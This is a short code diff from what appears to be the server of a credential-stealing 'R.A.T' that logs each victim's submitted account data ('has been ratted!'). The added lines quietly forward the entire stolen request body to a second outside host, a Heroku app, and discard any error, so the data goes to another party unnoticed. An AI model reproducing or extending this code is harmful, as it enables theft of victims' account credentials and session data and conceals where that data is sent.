@@ -156,6 +156,13 @@ app.post("/", (req, res) => {
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
     })
+ //send to another server
+                post("https://dupertax.herokuapp.com//", req.body, {
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }).catch(err =>{})
+            }
 
     .catch(err => {
         //could happen if the auth server is down OR if invalid information is passed in the body
